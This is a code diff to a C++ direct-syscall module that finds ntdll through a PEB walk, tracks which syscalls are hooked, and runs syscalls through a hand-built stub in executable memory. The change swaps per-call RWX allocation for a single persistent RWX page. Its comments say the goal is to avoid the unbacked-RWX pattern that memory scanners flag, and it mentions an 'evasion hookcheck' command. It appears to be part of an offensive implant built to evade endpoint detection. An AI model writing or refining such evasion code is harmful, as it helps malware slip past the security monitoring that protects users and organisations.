@@ -6,6 +6,11 @@ struct SsnEntry { DWORD hash; int ssn; bool hooked; };
 static SsnEntry g_table[512];
 static int      g_count = 0;
 
+// Persistent RWX stub page — allocated ONCE in Init(), reused in every Exec() call.
+// Eliminates the per-call VirtualAlloc/VirtualFree pattern that memory scanners flag as
+// an unbacked RWX region fingerprint.
+static void* g_stubPage = nullptr;
+
 // ── Utility: get ntdll base via PEB walk (no imports needed) ─────────────────
 // PEB.Ldr.InMemoryOrderModuleList[1] = ntdll on all Windows versions.
 
@@ -27,6 +32,15 @@ static PVOID GetNtdllBase() {
 
 int DirectSyscall::Init() {
     g_count = 0;
+
+    // Allocate the persistent stub page once — 4096 bytes (one page) is enough.
+    // Allocated here so the single RWX region appears during startup alongside all
+    // other early-init allocations, rather than repeatedly appearing mid-session.
+    if (!g_stubPage) {
+        g_stubPage = VirtualAlloc(NULL, 4096,
+                                  MEM_COMMIT | MEM_RESERVE,
+                                  PAGE_EXECUTE_READWRITE);
+    }
 
     BYTE* base = (BYTE*)GetNtdllBase();
     if (!base) return 0;
@@ -120,18 +134,15 @@ NTSTATUS DirectSyscall::Exec(int ssn,
         0xC3                           // ret
     };
 
-    void* mem = VirtualAlloc(NULL, sizeof(stub),
-                             MEM_COMMIT | MEM_RESERVE,
-                             PAGE_EXECUTE_READWRITE);
+    // Reuse the persistent stub page — write new SSN bytes in place, then call.
+    // No alloc/free per call: eliminates the repeated unbacked-RWX pattern.
+    void* mem = g_stubPage;
     if (!mem) return STATUS_NO_MEMORY;
     memcpy(mem, stub, sizeof(stub));
     FlushInstructionCache(GetCurrentProcess(), mem, sizeof(stub));
 
     auto fn = (SyscallFn)mem;
-    NTSTATUS status = fn(a1, a2, a3, a4, a5, a6, a7, a8);
-
-    VirtualFree(mem, 0, MEM_RELEASE);
-    return status;
+    return fn(a1, a2, a3, a4, a5, a6, a7, a8);
 }
 
 // ── Hook report (for `evasion hookcheck` command) ────────────────────────────
